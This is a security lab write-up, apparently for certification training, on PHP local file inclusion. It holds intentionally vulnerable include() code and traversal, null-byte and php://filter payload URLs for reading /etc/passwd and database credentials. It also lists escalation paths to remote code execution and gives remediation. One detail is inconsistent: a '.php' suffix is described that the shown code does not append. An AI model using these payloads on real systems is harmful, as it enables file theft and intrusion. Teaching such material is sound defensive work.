# 09 — Local File Inclusion (LFI)

GingerByte lab · CSTM preparation  
Covers: local file inclusion via unsanitised include() · /etc/passwd disclosure · PHP source disclosure via filter wrapper

---

## Exercise 1 — Read /etc/passwd via Local File Inclusion

### What it is

Local File Inclusion (LFI) occurs when a web application passes user-supplied input directly to a file-inclusion function (`include()`, `require()`, `fopen()`) without validating or sanitising the path. An attacker can traverse the directory structure using `../` sequences to escape the web root and read arbitrary files on the server — including sensitive system files and application source code.

### Vulnerable code

**`/var/www/html/view.php`**

```php
$page = $_GET['page'] ?? 'pages/about';

// ---- VULNERABILITY: LFI — user input passed directly to include() with no sanitisation ----
@include($page);
```

The user-supplied `page` parameter is passed straight to `include()` with no validation, no path canonicalisation, and no allowlist. PHP stream wrappers are also accepted.

### What an attacker can read

The server process (`www-data`) can read any file it has permission to access. Common targets:

| File | Contents |
|---|---|
| `/etc/passwd` | All system user accounts and home directories |
| `/etc/hosts` | Internal hostnames and IP addresses |
| `/proc/self/environ` | Environment variables — may include credentials or secrets |
| `/var/www/html/config/db.php` | Database credentials (read the application's own source) |

### Exploitation steps — /etc/passwd

1. Navigate to `http://localhost:8080/view.php?page=pages/about` — confirm the page loads normally
2. Note the URL structure: the `page` parameter maps to a file path
3. Attempt directory traversal by replacing the page value with a path traversal sequence:
   ```
   http://localhost:8080/view.php?page=../../../../etc/passwd
   ```
   The server appends `.php` → tries to include `/etc/passwd.php` — this will fail (file does not exist)

4. Use the **null byte technique** to truncate the `.php` suffix (PHP < 5.3.4 only):
   ```
   http://localhost:8080/view.php?page=../../../../etc/passwd%00
   ```
   The `%00` (null byte) terminates the string before `.php` is appended

5. **Better approach — use a PHP wrapper that handles any extension:**
   ```
   http://localhost:8080/view.php?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
   ```
   This uses PHP's filter stream — the file contents are returned as Base64 before PHP can execute them.

6. Decode the Base64 output in Burp Decoder or with:
   ```bash
   echo "<base64 output>" | base64 -d
   ```

**Expected output (partial):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/var/lib/mysql:/bin/false
```

---

## Exercise 2 — PHP Source Disclosure via Filter Wrapper

### What it is

The `php://filter` wrapper is a PHP meta-wrapper that applies transformations to a data stream before it is processed. By encoding the file contents as Base64 before inclusion, the PHP code is returned as text rather than executed — exposing application source code.

### Why this matters

Reading the source code of configuration files, login pages, or payment handlers can reveal:
- **Database credentials** (`db.php`, `config.php`)
- **Secret keys and API tokens** (`config.php`, `.env`)
- **Business logic and vulnerability details** (the exact SQL queries, session handling, etc.)
- **Admin passwords or hardcoded credentials**

### Exploitation steps — read database credentials

1. Use the filter wrapper to request the database config file:
   ```
   http://localhost:8080/view.php?page=php://filter/convert.base64-encode/resource=includes/db.php
   ```

2. Copy the Base64 string from the response
3. Decode in Burp Decoder → **Decode as → Base64**
4. Read the PHP source — look for database credentials:
   ```php
   $host = 'db';
   $user = 'gingerbyte';
   $pass = 'gingerbyte123';
   $dbname = 'gingerbyte';
   ```

5. Repeat for other interesting files:
   - `php://filter/convert.base64-encode/resource=login.php` → full login.php source (reveals SQL injection)
   - `php://filter/convert.base64-encode/resource=admin/index.php` → admin logic and backdoor parameters

### Security impact — LFI chain

LFI alone reads files. Combined with other vulnerabilities it escalates rapidly:

| LFI + ... | Escalation path |
|---|---|
| Log poisoning | If the server logs user-supplied values (User-Agent, username) to a file LFI can reach, inject PHP into the log entry first, then include the log → **Remote Code Execution** |
| `/proc/self/environ` | If environment variable injection is possible, include the environment file to execute PHP |
| File upload vulnerability | Upload a PHP file disguised as an image, then use LFI to include it → **Remote Code Execution** |
| SSH key theft | Read `/home/<user>/.ssh/id_rsa` → offline crack or direct use |

### Security impact

- **Credential disclosure** — database passwords, API keys, admin credentials
- **Full source code exposure** — reveals all other vulnerabilities, business logic, and secret values
- **Path to RCE** — via log poisoning or file upload chaining
- **Internal network reconnaissance** — `/etc/hosts`, `/proc/net/tcp` reveal internal services

### OWASP category

A03 — Injection (path traversal / file inclusion)  
A05 — Security Misconfiguration (PHP wrappers not disabled)

### Remediation

- **Never pass user input directly to `include()`, `require()`, `fopen()`**
- Use a **whitelist** of allowed page names and map them to file paths server-side:
  ```php
  $allowed = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
  $page = $_GET['page'] ?? 'home';
  if (!isset($allowed[$page])) {
      die('Page not found');
  }
  include($allowed[$page]);
  ```
- **Disable dangerous PHP wrappers** in `php.ini`:
  ```
  allow_url_include = Off
  allow_url_fopen = Off
  ```
- Validate that the resolved path starts with the expected web root using `realpath()`:
  ```php
  $base = realpath('/var/www/html/pages/');
  $real = realpath($base . '/' . $page . '.php');
  if (strpos($real, $base) !== 0) die('Forbidden');
  ```
- Run the web server process with the minimum filesystem permissions required

---

## Summary

| Exercise | Finding | Impact | OWASP |
|---|---|---|---|
| 1 — Path traversal | Read `/etc/passwd` and system files via `../../../../` traversal | High | A03 |
| 2 — PHP filter wrapper | Read full PHP source of any application file including DB credentials | Critical | A03, A05 |
| Combined | LFI + file upload → Remote Code Execution | Critical | A03 |
